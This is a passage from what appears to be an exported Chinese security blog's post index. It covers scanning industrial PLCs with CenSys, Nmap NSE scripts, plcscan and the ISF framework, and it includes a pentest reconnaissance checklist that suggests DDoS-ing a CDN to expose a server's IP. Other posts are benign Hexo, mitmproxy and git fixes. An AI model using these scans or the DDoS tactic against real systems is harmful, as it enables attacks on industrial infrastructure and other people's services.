<p><img src="/posts/bbe71824/1591857098125-9d35baeb-30fb-4495-98b0-b034250af95a.png" alt="1591857098125-9d35baeb-30fb-4495-98b0-b034250af95a.png"></p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line"># CenSys</span><br><span class="line">protocols: &quot;502/modbus&quot;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/bbe71824/1591864225438-5d281938-908b-44b6-bd74-9457591e3de9.png" alt="1591864225438-5d281938-908b-44b6-bd74-9457591e3de9.png"></p>
<h3 id="NSE-Scripts"><a href="#NSE-Scripts" class="headerlink" title="NSE Scripts"></a>NSE Scripts</h3><p>NSE就是开源扫描工具Nmap的脚本引擎（Nmap Scripting Engine），我们可以通过使用自带的Nmap脚本，也可以使用Lua语言进行自定义编写。在工控资产探测方面，也有很多优秀的脚本可以使用，下面对部分常用脚本介绍并进行演示：<br>• modbus-discover.nse<br>可以用于Modbus TCP设备的探测发现<br><img src="/posts/bbe71824/1591864963702-ac2bfa6b-b3df-4253-ac1b-32315ba2d7b1.png" alt="1591864963702-ac2bfa6b-b3df-4253-ac1b-32315ba2d7b1.png"><br>• s7-info.nse<br>可以获得基于S7协议的组件的详细信息  脚本比较多，可以自行查询，脚本存放位置：<br><img src="/posts/bbe71824/1591865590055-f341f532-64f4-474d-83be-7e5e82ad760b.png" alt="1591865590055-f341f532-64f4-474d-83be-7e5e82ad760b.png"></p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Mac：/usr/local/Cellar/nmap/7.80_1/share/nmap/scripts</span><br><span class="line">Linux：/usr/share/nmap/scripts/</span><br></pre></td></tr></table></figure>
<h3 id="PLC-Device-Scanner"><a href="#PLC-Device-Scanner" class="headerlink" title="PLC Device Scanner"></a>PLC Device Scanner</h3><p>也叫做plcscan，可以对modbus与s7协议设备进行扫描。<br><img src="/posts/bbe71824/1591873390660-616279dc-17cb-4f34-99b1-7217d5430b26.png" alt="1591873390660-616279dc-17cb-4f34-99b1-7217d5430b26.png"><br>使用步骤： 先将需要扫描的ip按行写入ips.txt，比如需要对modbus设备进行扫描，命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python plcscan.py --hosts-list=ips.txt --ports=502</span><br></pre></td></tr></table></figure>
<p><img src="/posts/bbe71824/1591875435078-5fad2e6e-adaf-434b-82b4-788ce8528be4.png" alt="1591875435078-5fad2e6e-adaf-434b-82b4-788ce8528be4.png"></p>
<h3 id="ISF"><a href="#ISF" class="headerlink" title="ISF"></a>ISF</h3><p>这是一款实用Python语言编写的工控系统漏洞利用框架，与MetaSploit使用起来很像。本文主要介绍它的工控资产探测模块，下面是运行截图：<br><img src="/posts/bbe71824/1591875377532-8105d673-7e51-4e01-874d-f6bcfb91d15f.png" alt="1591875377532-8105d673-7e51-4e01-874d-f6bcfb91d15f.png"><br>搜索名称以scan结尾的模块<br><img src="/posts/bbe71824/1591875330458-86d2c057-652b-406f-a775-15ef57e8a481.png" alt="1591875330458-86d2c057-652b-406f-a775-15ef57e8a481.png"><br>以s7comm_scan模块为例，先查看需要设置哪些选项<br><img src="/posts/bbe71824/1591876592336-2fd54cfc-3e5d-4468-b758-f9cb1940a3ea.png" alt="1591876592336-2fd54cfc-3e5d-4468-b758-f9cb1940a3ea.png"><br>设置目标IP并执行，可以发现打印出了该设备的版本、模块名称等信息。<br><img src="/posts/bbe71824/1591876860112-9b7ab01e-3c3a-4fdc-8760-f2f26c4677ec.png" alt="1591876860112-9b7ab01e-3c3a-4fdc-8760-f2f26c4677ec.png"></p>
<h3 id="WireShark"><a href="#WireShark" class="headerlink" title="WireShark"></a>WireShark</h3><p>网络封包分析软件，支持协议广泛，功能也不少。本文主要介绍它对于工控资产的识别功能及相关操作。<br>本文以西门子S7协议为例，第一步先启动抓包，接着使用S7 PLC仿真工具连接，当服务端显示连接完成，使用wireshark输入cotp进行过滤，剩下的就是S7协议相关的流量。<br><img src="/posts/bbe71824/1591947455270-84e6c5c2-7211-43e7-97b8-ba33abbb27ce.png" alt="1591947455270-84e6c5c2-7211-43e7-97b8-ba33abbb27ce.png"><br>根据S7协议的规则，经过分析可以发现<br>编号382号数据包：请求通讯；<br>编号330号数据包：配置通讯；<br>编号334号数据包：发送数据进行通讯；<br>编号343号数据包中可以看到此PLC的CPU型号、序列号等指纹信息，如下图所示。<br><img src="/posts/bbe71824/1591947439984-10621c3e-66d8-4290-99bd-f2577ded5e05.png" alt="1591947439984-10621c3e-66d8-4290-99bd-f2577ded5e05.png"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.bilibili.com/video/BV1Ft41177cs/">https://www.bilibili.com/video/BV1Ft41177cs/</a><br><a href="https://www.anquanke.com/post/id/189429">https://www.anquanke.com/post/id/189429</a><br><a href="https://www.freebuf.com/articles/ics-articles/209786.html">https://www.freebuf.com/articles/ics-articles/209786.html</a><br><a href="https://www.freebuf.com/articles/ics-articles/220302.html">https://www.freebuf.com/articles/ics-articles/220302.html</a></p>
]]></content>
      <categories>
        <category>工控安全</category>
      </categories>
      <tags>
        <tag>工控安全</tag>
      </tags>
  </entry>
  <entry>
    <title>解决NexT主题点击日志报错archives/%7C%7C%20archive</title>
    <url>/posts/df32273d.html</url>
    <content><![CDATA[<p>先确定点击归档访问正常，点击日志发生报错</p>
<span id="more"></span>

<p>现象如图：</p>
<p><img src="/posts/df32273d/image-20200526131814009.png" alt="image-20200526131814009"></p>
<p>解决办法：</p>
<p>编辑hexo主题目录下&#x2F;layout&#x2F;_macro&#x2F;sidebar.swig</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /Users/iqiqiya/blog/themes/next/layout/_macro/sidebar.swig</span><br></pre></td></tr></table></figure>

<p>注释掉</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123; url_for(theme.menu.archives).split(&#x27;||&#x27;)[0] | trim &#125;&#125;&quot;</span>&gt;</span> </span><br></pre></td></tr></table></figure>

<p>并添加</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123;url_for(theme.menu.archives.split(&#x27;||&#x27;)[0])| trim&#125;&#125;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如下图：</p>
<p><img src="/posts/df32273d/image-20200526132558867.png" alt="image-20200526132558867"></p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>archives乱码</tag>
      </tags>
  </entry>
  <entry>
    <title>信息搜集（黑盒）小记</title>
    <url>/posts/adb6226f.html</url>
    <content><![CDATA[<p>本文记录了一些渗透测试工作中的信息搜集技巧~</p>
<span id="more"></span>

<ul>
<li>探测子域名信息<ul>
<li>搜索引擎语法<ul>
<li>site:example.com</li>
</ul>
</li>
<li>威胁情报<ul>
<li><a href="https://x.threatbook.cn/">微步在线</a></li>
<li><a href="https://ti.360.cn/">360威胁情报中心</a></li>
</ul>
</li>
<li>大数据分析<ul>
<li><a href="https://www.5118.com/">五一一八</a></li>
</ul>
</li>
<li>综合利用<ul>
<li>Sublist3r</li>
</ul>
</li>
</ul>
</li>
<li>探测真实IP信息<ul>
<li>多地Ping<ul>
<li><a href="http://ping.chinaz.com/">Chinaz</a></li>
</ul>
</li>
<li>DNS解析记录&#x2F;历史记录<ul>
<li><a href="https://dnsdb.io/zh-cn/">dnsdb</a></li>
</ul>
</li>
<li>邮件验证码</li>
<li>Fofa&#x2F;Zoomeye&#x2F;shodon</li>
<li>DDOS消耗CND进行IP泄漏</li>
</ul>
</li>
<li>反查域名<ul>
<li>Ip138</li>
</ul>
</li>
<li>搜集旁站信息<ul>
<li>Chinaz</li>
<li>Webscan</li>
</ul>
</li>
<li>搜集C段信息<ul>
<li>Webscan</li>
</ul>
</li>
<li>搜集Whios信息<ul>
<li>Chinaz</li>
<li>联系人&#x2F;电话&#x2F;邮箱反查</li>
</ul>
</li>
<li>搜集网站单位信息<ul>
<li><a href="http://www.gsxt.gov.cn/index.html">企业信用信息公示系统</a></li>
<li>企查查&#x2F;启信宝&#x2F;企信通</li>
</ul>
</li>
<li>搜集网站备案信息<ul>
<li>ICP备案系统</li>
</ul>
</li>
<li>搜集服务器和中间件信息<ul>
<li>Headers信息<ul>
<li>Whatweb</li>
</ul>
</li>
<li>Banner信息<ul>
<li>Wappalyzer</li>
</ul>
</li>
<li>云悉指纹识别</li>
</ul>
</li>
<li>搜集历史漏洞信息<ul>
<li>Exploit-db</li>
<li>CNVD</li>
<li>CVE</li>
</ul>
</li>
<li>搜集WAF信息<ul>
<li>Wafw00f</li>
<li>Nmap<ul>
<li>http-waf-detect</li>
<li>http-waf-fingerprint</li>
</ul>
</li>
</ul>
</li>
<li>枚举敏感文件&#x2F;路径<ul>
<li>Dirsearch</li>
<li>Dirb<ul>
<li>Robots.txt</li>
<li>sitemap.xml</li>
<li>wwwroot.zip</li>
<li>.svn</li>
<li>后台登录地址</li>
</ul>
</li>
</ul>
</li>
<li>搜集开放端口信息<ul>
<li>Nmap</li>
<li>Fofa</li>
</ul>
</li>
<li>公开文件检索<ul>
<li>搜索引擎语法规则</li>
<li>Github信息泄露</li>
</ul>
</li>
</ul>
<p>思维导图：</p>
<p><img src="/posts/adb6226f/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%EF%BC%88%E9%BB%91%E7%9B%92%EF%BC%89.png" alt="信息搜集（黑盒）"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>信息搜集</tag>
      </tags>
  </entry>
  <entry>
    <title>解决安装mitmproxy时提示ERROR: Cannot uninstall &#39;ruamel-yaml&#39;</title>
    <url>/posts/e51995b4.html</url>
    <content><![CDATA[<p>mitmproxy是一款支持SSL的HTTP代理，它可以用于调试HTTP通信，发起中间人攻击等。mitmproxy提供了一个控制台接口用于动态拦 截和编辑HTTP数据包。</p>
<span id="more"></span>

<h3 id="python3安装mitmproxy"><a href="#python3安装mitmproxy" class="headerlink" title="python3安装mitmproxy"></a>python3安装mitmproxy</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install mitmproxy -i http://pypi.douban.com/simple/ --trusted-host pypi.douban.com</span><br></pre></td></tr></table></figure>

<h3 id="安装失败，出现如下报错信息"><a href="#安装失败，出现如下报错信息" class="headerlink" title="安装失败，出现如下报错信息"></a>安装失败，出现如下报错信息</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Installing collected packages: zstandard, Brotli, ruamel.yaml, mitmproxy</span><br><span class="line">  Attempting uninstall: ruamel.yaml</span><br><span class="line">    Found existing installation: ruamel-yaml 0.15.87</span><br><span class="line">ERROR: Cannot uninstall &#x27;ruamel-yaml&#x27;. It is a distutils installed project and thus we cannot accurately determine which files belong to it which would lead to only a partial uninstall.</span><br></pre></td></tr></table></figure>

<p><img src="/posts/e51995b4/image-20210224123606581.png" alt="image-20210224123606581"></p>
<p>根据提示，需要安装新版本的ruamel-yaml，但是Anaconda3已经安装了 ruamel-yaml，版本是0.15.87</p>
<p>需要进行卸载</p>
<p>卸载出错</p>
<h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><h4 id="方法一：强制删除ruamel-yaml"><a href="#方法一：强制删除ruamel-yaml" class="headerlink" title="方法一：强制删除ruamel-yaml"></a>方法一：强制删除ruamel-yaml</h4><p>找到安装路径，比如</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf C:\software\Anaconda3\Lib\site-packages\ruamel*</span><br></pre></td></tr></table></figure>

<p>然后继续执行安装mitmproxy，若依然报错</p>
<p><strong>使用Everything进行搜索删除，比较干净</strong></p>
<p><img src="/posts/e51995b4/image-20210224124747264.png" alt="image-20210224124747264"></p>
<p>重新尝试安装mitmproxy</p>
<p>成功截图</p>
<p><img src="/posts/e51995b4/image-20210224125016412.png" alt="image-20210224125016412"></p>
<p>并且pip list查看 发现新版本安装成功</p>
<p><img src="/posts/e51995b4/image-20210224124312862.png" alt="image-20210224124312862"></p>
<h4 id="方法二：修改安装命令，忽略已安装的包"><a href="#方法二：修改安装命令，忽略已安装的包" class="headerlink" title="方法二：修改安装命令，忽略已安装的包"></a>方法二：修改安装命令，忽略已安装的包</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install -r requirements.txt -i http://pypi.douban.com/simple/ --trusted-host pypi.douban.com --ignore-installed ruamel.yaml</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>小技巧</category>
      </categories>
      <tags>
        <tag>mitmproxy</tag>
        <tag>问题解决</tag>
      </tags>
  </entry>
  <entry>
    <title>解决git clone过程中出现的问题</title>
    <url>/posts/1e85a4e1.html</url>
    <content><![CDATA[<p>在使用git clone时出现了一些问题，抽空来做个汇总，慢慢更新~</p>
<span id="more"></span>

<h2 id="问题一，git下载过慢"><a href="#问题一，git下载过慢" class="headerlink" title="问题一，git下载过慢"></a>问题一，git下载过慢</h2><p>解决办法：</p>
<p>对git配置局域网代理，可选方式有proxychains，SocksCap，油猴脚本，gitee等</p>
<p>当然，最简单的方式终端执行以下命令就好</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Windows/Mac/Linux</span></span><br><span class="line">git config --global http.proxy <span class="string">&quot;http://127.0.0.1:7890&quot;</span></span><br><span class="line">git config --global https.proxy <span class="string">&quot;http://127.0.0.1:7890&quot;</span></span><br></pre></td></tr></table></figure>



<p>或者替换github下载地址</p>
<p><a href="https://github.com/attify/firmware-analysis-toolkit.git">https://github.com/attify/firmware-analysis-toolkit.git</a></p>
<p><a href="https://hub.fastgit.org/attify/firmware-analysis-toolkit.git">https://hub.fastgit.org/attify/firmware-analysis-toolkit.git</a></p>
<p><a href="https://gitclone.com/github.com/attify/firmware-analysis-toolkit.git">https://gitclone.com/github.com/attify/firmware-analysis-toolkit.git</a></p>
<p><a href="https://github.com.cnpmjs.org/attify/firmware-analysis-toolkit.git">https://github.com.cnpmjs.org/attify/firmware-analysis-toolkit.git</a></p>
<p>GitHub 文件加速</p>
<p><a href="https://github.91chifun.workers.dev/">https://github.91chifun.workers.dev/</a></p>
<h2 id="问题二，git-clone过程出现报错"><a href="#问题二，git-clone过程出现报错" class="headerlink" title="问题二，git clone过程出现报错"></a>问题二，git clone过程出现报错</h2><p>例如：</p>
<p>curl: (35) OpenSSL SSL_connect: Connection was reset in connection to<br>  github.com:443</p>
<p>解决办法：</p>
<p>更新git客户端软件</p>
<p>可以官网下载手动覆盖更新，也可以命令解决</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Windows/Mac/Linux</span></span><br><span class="line">git update-git-for-windows</span><br></pre></td></tr></table></figure>



<h2 id="问题三，git-push过程出现报错"><a href="#问题三，git-push过程出现报错" class="headerlink" title="问题三，git push过程出现报错"></a>问题三，git push过程出现报错</h2><p>例如：</p>
<p>fatal: unable to access ‘<a href="https://github.com/iqiqiya/iotRat.git/&#39;">https://github.com/iqiqiya/iotRat.git/&#39;</a>: OpenSSL SSL_connect: SSL_ERROR_SYSCALL in connection to github.com:443 </p>
<p>解决办法：</p>
<p>使用魔法 可以全局代理 也可以git使用局域网代理（http&#x2F;socks）</p>
<p>http代理参考问题一</p>
]]></content>
      <categories>
        <category>小技巧</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>解决设置permalink后hexo-asset-image图片路径出错</title>
    <url>/posts/74b62043.html</url>
    <content><![CDATA[<h3 id="原因："><a href="#原因：" class="headerlink" title="原因："></a>原因：</h3><p>在设置了permalink后，文章与hexo-asset-image生成的图片路径不同，导致图片无法正常显示。</p>
<span id="more"></span>

<h3 id="解决办法："><a href="#解决办法：" class="headerlink" title="解决办法："></a>解决办法：</h3><p>修改hexo-asset-image配置文件内容就好，笔者permalink设置如下：</p>
<p><a href="https://iqiqiya.github.io/posts/df32273d.html">https://iqiqiya.github.io/posts/df32273d.html</a></p>
<p>修改第19行与20行即可，内容如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> cheerio = <span class="built_in">require</span>(<span class="string">&#x27;cheerio&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-string</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getPosition</span>(<span class="params">str, m, i</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> str.<span class="title function_">split</span>(m, i).<span class="title function_">join</span>(m).<span class="property">length</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> version = <span class="title class_">String</span>(hexo.<span class="property">version</span>).<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">hexo.<span class="property">extend</span>.<span class="property">filter</span>.<span class="title function_">register</span>(<span class="string">&#x27;after_post_render&#x27;</span>, <span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> config = hexo.<span class="property">config</span>;</span><br><span class="line">  <span class="keyword">if</span>(config.<span class="property">post_asset_folder</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> link = data.<span class="property">permalink</span>;</span><br><span class="line">    <span class="keyword">if</span>(version.<span class="property">length</span> &gt; <span class="number">0</span> &amp;&amp; <span class="title class_">Number</span>(version[<span class="number">0</span>]) == <span class="number">3</span>)</span><br><span class="line">       <span class="keyword">var</span> beginPos = <span class="title function_">getPosition</span>(link, <span class="string">&#x27;/&#x27;</span>, <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">       <span class="keyword">var</span> beginPos = <span class="title function_">getPosition</span>(link, <span class="string">&#x27;/&#x27;</span>, <span class="number">3</span>) + <span class="number">1</span>;</span><br><span class="line">		<span class="comment">// In hexo 3.1.1, the permalink of &quot;about&quot; page is like &quot;.../about/index.html&quot;.</span></span><br><span class="line">    <span class="keyword">var</span> endPos = link.<span class="title function_">lastIndexOf</span>(<span class="string">&#x27;.&#x27;</span>);<span class="comment">//modify one.</span></span><br><span class="line">    link = link.<span class="title function_">substring</span>(beginPos, endPos) + <span class="string">&quot;/&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> toprocess = [<span class="string">&#x27;excerpt&#x27;</span>, <span class="string">&#x27;more&#x27;</span>, <span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; toprocess.<span class="property">length</span>; i++)&#123;</span><br><span class="line">      <span class="keyword">var</span> key = toprocess[i];</span><br><span class="line"></span><br><span class="line">      <span class="keyword">var</span> $ = cheerio.<span class="title function_">load</span>(data[key], &#123;</span><br><span class="line">        <span class="attr">ignoreWhitespace</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">xmlMode</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">lowerCaseTags</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">decodeEntities</span>: <span class="literal">false</span></span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      $(<span class="string">&#x27;img&#x27;</span>).<span class="title function_">each</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> ($(<span class="variable language_">this</span>).<span class="title function_">attr</span>(<span class="string">&#x27;src&#x27;</span>))&#123;</span><br><span class="line">            <span class="comment">// For windows style path, we replace &#x27;\&#x27; to &#x27;/&#x27;.</span></span><br><span class="line">            <span class="keyword">var</span> src = $(<span class="variable language_">this</span>).<span class="title function_">attr</span>(<span class="string">&#x27;src&#x27;</span>).<span class="title function_">replace</span>(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span>(!<span class="regexp">/http[s]*.*|\/\/.*/</span>.<span class="title function_">test</span>(src) &amp;&amp;</span><br><span class="line">               !<span class="regexp">/^\s*\//</span>.<span class="title function_">test</span>(src)) &#123;</span><br><span class="line">              <span class="comment">// For &quot;about&quot; page, the first part of &quot;src&quot; can&#x27;t be removed.</span></span><br><span class="line">              <span class="comment">// In addition, to support multi-level local directory.</span></span><br><span class="line">              <span class="keyword">var</span> linkArray = link.<span class="title function_">split</span>(<span class="string">&#x27;/&#x27;</span>).<span class="title function_">filter</span>(<span class="keyword">function</span>(<span class="params">elem</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> elem != <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">              &#125;);</span><br><span class="line">              <span class="keyword">var</span> srcArray = src.<span class="title function_">split</span>(<span class="string">&#x27;/&#x27;</span>).<span class="title function_">filter</span>(<span class="keyword">function</span>(<span class="params">elem</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> elem != <span class="string">&#x27;&#x27;</span> &amp;&amp; elem != <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">              &#125;);</span><br><span class="line">              <span class="keyword">if</span>(srcArray.<span class="property">length</span> &gt; <span class="number">1</span>)</span><br><span class="line">                srcArray.<span class="title function_">shift</span>();</span><br><span class="line">              src = srcArray.<span class="title function_">join</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">              $(<span class="variable language_">this</span>).<span class="title function_">attr</span>(<span class="string">&#x27;src&#x27;</span>, config.<span class="property">root</span> + link + src);</span><br><span class="line">              <span class="variable language_">console</span>.<span class="property">info</span>&amp;&amp;<span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&quot;update link as:--&gt;&quot;</span>+ config.<span class="property">root</span> + link + src);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="property">info</span>&amp;&amp;<span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&quot;no src attr, skipped...&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="property">info</span>&amp;&amp;<span class="variable language_">console</span>.<span class="title function_">info</span>($(<span class="variable language_">this</span>));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">      data[key] = $.<span class="title function_">html</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>图片路径出错</tag>
      </tags>
  </entry>
</search>
